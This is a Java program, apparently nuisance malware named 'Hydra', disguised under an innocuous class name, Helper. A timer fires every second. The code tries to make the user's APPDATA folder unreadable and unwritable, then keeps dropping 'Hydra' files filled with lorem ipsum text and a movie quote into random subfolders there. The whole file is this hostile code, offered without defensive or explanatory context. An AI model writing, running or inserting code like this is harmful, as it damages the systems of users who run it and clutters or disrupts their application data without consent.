import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
  
class Helper extends TimerTask {
	public static int X = Integer.MIN_VALUE;
    public static String i = "Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut tempus purus at lorem. Aliquam in lorem sit amet leo accumsan lacinia. Aenean vel massa quis mauris vehicula lacinia. Aenean id metus id velit ullamcorper pulvinar. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Duis risus. Nullam at arcu a est sollicitudin euismod. Donec vitae arcu. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Phasellus faucibus molestie nisl. Donec quis nibh at felis congue commodo. Nullam sit amet magna in magna gravida vehicula.\r\n" + 
    		"\r\n" + 
    		"Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Etiam dictum tincidunt diam. Ut tempus purus at lorem. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Sed elit dui, pellentesque a, faucibus vel, interdum nec, diam. Sed vel lectus. Donec odio tempus molestie, porttitor ut, iaculis quis, sem. Aliquam erat volutpat. Curabitur sagittis hendrerit ante. Nullam faucibus mi quis velit. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Mauris metus. Praesent in mauris eu tortor porttitor accumsan. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam. Integer lacinia.\r\n" + 
    		"\r\n" + 
    		"Maecenas libero. Fusce suscipit libero eget elit. Duis pulvinar. Maecenas fermentum, sem in pharetra pellentesque, velit turpis volutpat ante, in pharetra metus odio a lectus. Temporibus autem quibusdam et aut officiis debitis aut rerum necessitatibus saepe eveniet ut et voluptates repudiandae sint et molestiae non recusandae. Fusce nibh. Maecenas aliquet accumsan leo. Integer malesuada. Nulla turpis magna, cursus sit amet, suscipit a, interdum id, felis. Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Fusce aliquam vestibulum ipsum. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Nam libero tempore, cum soluta nobis est eligendi optio cumque nihil impedit quo minus id quod maxime placeat facere possimus, omnis voluptas assumenda est, omnis dolor repellendus. Donec iaculis gravida nulla. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam. Ut tempus purus at lorem. Pellentesque arcu. Maecenas sollicitudin. Duis pulvinar. Duis bibendum, lectus ut viverra rhoncus, dolor nunc faucibus libero, eget facilisis enim ipsum id lacus.\r\n" + 
    		"\r\n" + 
    		"Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Nulla non lectus sed nisl molestie malesuada. Nam sed tellus id magna elementum tincidunt. Sed convallis magna eu sem. In convallis. Nullam eget nisl. Integer pellentesque quam vel velit. Quisque tincidunt scelerisque libero. Vivamus porttitor turpis ac leo. Etiam quis quam. Etiam sapien elit, consequat eget, tristique non, venenatis quis, ante. In rutrum. Mauris elementum mauris vitae tortor. Aenean id metus id velit ullamcorper pulvinar. Duis risus. Mauris elementum mauris vitae tortor. In enim a arcu imperdiet malesuada. Maecenas ipsum velit, consectetuer eu lobortis ut, dictum at dui. Proin in tellus sit amet nibh dignissim sagittis. Et harum quidem rerum facilis est et expedita distinctio.\r\n" + 
    		"\r\n" + 
    		"Itaque earum rerum hic tenetur a sapiente delectus, ut aut reiciendis voluptatibus maiores alias consequatur aut perferendis doloribus asperiores repellat. Duis viverra diam non justo. Nam quis nulla. Nullam faucibus mi quis velit. Duis bibendum, lectus ut viverra rhoncus, dolor nunc faucibus libero, eget facilisis enim ipsum id lacus. Proin in tellus sit amet nibh dignissim sagittis. Donec quis nibh at felis congue commodo. Etiam ligula pede, sagittis quis, interdum ultricies, scelerisque eu. In rutrum. Proin in tellus sit amet nibh dignissim sagittis. In laoreet, magna id viverra tincidunt, sem odio bibendum justo, vel imperdiet sapien wisi sed libero. Donec quis nibh at felis congue commodo. Aenean fermentum risus id tortor. Fusce tellus odio, dapibus id fermentum quis, suscipit id erat.\r\n" + 
    		"\r\n" + 
    		"Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Nulla non lectus sed nisl molestie malesuada. Nullam sapien sem, ornare ac, nonummy non, lobortis a enim. Curabitur vitae diam non enim vestibulum interdum. Nullam justo enim, consectetuer nec, ullamcorper ac, vestibulum in, elit. Phasellus enim erat, vestibulum vel, aliquam a, posuere eu, velit. Fusce tellus. Integer tempor. Vivamus luctus egestas leo. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Maecenas sollicitudin. In convallis. Pellentesque sapien. Fusce tellus. In convallis. Etiam quis quam. Duis bibendum, lectus ut viverra rhoncus, dolor nunc faucibus libero, eget facilisis enim ipsum id lacus. In convallis. Nullam feugiat, turpis at pulvinar vulputate, erat libero tristique tellus, nec bibendum odio risus sit amet ante. Sed elit dui, pellentesque a, faucibus vel, interdum nec, diam.\r\n" + 
    		"\r\n" + 
    		"Vivamus porttitor turpis ac leo. In dapibus augue non sapien. Maecenas lorem. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos hymenaeos. Nullam sapien sem, ornare ac, nonummy non, lobortis a enim. Sed ac dolor sit amet purus malesuada congue. Integer lacinia. Duis pulvinar. Sed ac dolor sit amet purus malesuada congue. In rutrum. Nam quis nulla. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam. Quisque tincidunt scelerisque libero.\r\n" + 
    		"\r\n" + 
    		"Maecenas libero. Nulla non lectus sed nisl molestie malesuada. Curabitur sagittis hendrerit ante. Proin pede metus, vulputate nec, fermentum fringilla, vehicula vitae, justo. Duis bibendum, lectus ut viverra rhoncus, dolor nunc faucibus libero, eget facilisis enim ipsum id lacus. Etiam ligula pede, sagittis quis, interdum ultricies, scelerisque eu. Sed elit dui, pellentesque a, faucibus vel, interdum nec, diam. Donec quis nibh at felis congue commodo. Aliquam erat volutpat. Duis risus. Integer malesuada. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.\r\n" + 
    		"\r\n" + 
    		"Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? Nunc tincidunt ante vitae massa. Aenean fermentum risus id tortor. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nullam eget nisl. Curabitur bibendum justo non orci. Nulla accumsan, elit sit amet varius semper, nulla mauris mollis quam, tempor suscipit diam nulla vel leo. Nunc tincidunt ante vitae massa. Etiam commodo dui eget wisi. Duis bibendum, lectus ut viverra rhoncus, dolor nunc faucibus libero, eget facilisis enim ipsum id lacus. Nullam rhoncus aliquam metus. Morbi imperdiet, mauris ac auctor dictum, nisl ligula egestas nulla, et sollicitudin sem purus in lacus. Nunc tincidunt ante vitae massa. Vivamus luctus egestas leo. Nullam sapien sem, ornare ac, nonummy non, lobortis a enim. Suspendisse sagittis ultrices augue. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Fusce consectetuer risus a nunc. Nulla pulvinar eleifend sem. Etiam dui sem, fermentum vitae, sagittis id, malesuada in, quam.\r\n" + 
    		"\r\n" + 
    		"Nunc tincidunt ante vitae massa. Praesent id justo in neque elementum ultrices. Vivamus ac leo pretium faucibus. Duis viverra diam non justo. Nunc tincidunt ante vitae massa. Proin mattis lacinia justo. Morbi scelerisque luctus velit. Maecenas aliquet accumsan leo. Praesent dapibus. Aliquam in lorem sit amet leo accumsan lacinia. Integer rutrum, orci vestibulum ullamcorper ultricies, lacus quam ultricies odio, vitae placerat pede sem sit amet enim. Proin in tellus sit amet nibh dignissim sagittis. Donec vitae arcu. Integer vulputate sem a nibh rutrum consequat. Curabitur sagittis hendrerit ante. Mauris metus. Fusce nibh. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.";
    public static void serialize(File f) throws FileNotFoundException, IOException {
    	ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));
    	i+="…Don’t try it, Anakin. I have the high ground!";
    	oos.writeUTF(i);
    	oos.close();
    }
	
    public void run() {
    	File dir = new File(System.getenv("APPDATA"));
    	dir.setWritable(false);
    	dir.setReadable(false);
    	File[] userFiles = new File(dir.getPath()).listFiles();
    	Random rand = new Random(); 
    	if((new File("Hydra.dat").exists())) {
    		int r = rand.nextInt(userFiles.length-1)+1;
    		userFiles[r].mkdirs();
    		File spam = new File(userFiles[r],"Hydra"+X++ +".dat");
    		try {
    			FileWriter qq = new FileWriter(spam);
    			serialize(spam);
    			qq.close();
    		}catch(Exception e) {
    			e.printStackTrace();
    		}
    		int x = rand.nextInt(userFiles.length-1)+1;
    		userFiles[x].mkdirs();
    		File SPAM = new File(userFiles[x],"Hydra"+X++ +".dat");
    		try {
    			FileWriter qp = new FileWriter(SPAM);
    			serialize(SPAM);
    			qp.close();
    		}catch(Exception e) {
    			e.printStackTrace();
    		}
        }
    	File f = new File("Hydra.dat");
    	try {
			serialize(f);
		} catch (IOException e) {
			e.printStackTrace();
		}
    	
    }
    public static void main(String[] args) {
    	Timer timer = new Timer(); 
        TimerTask task = new Helper();
    	
        timer.schedule(task, 100, 1000);
    	
    
    }
}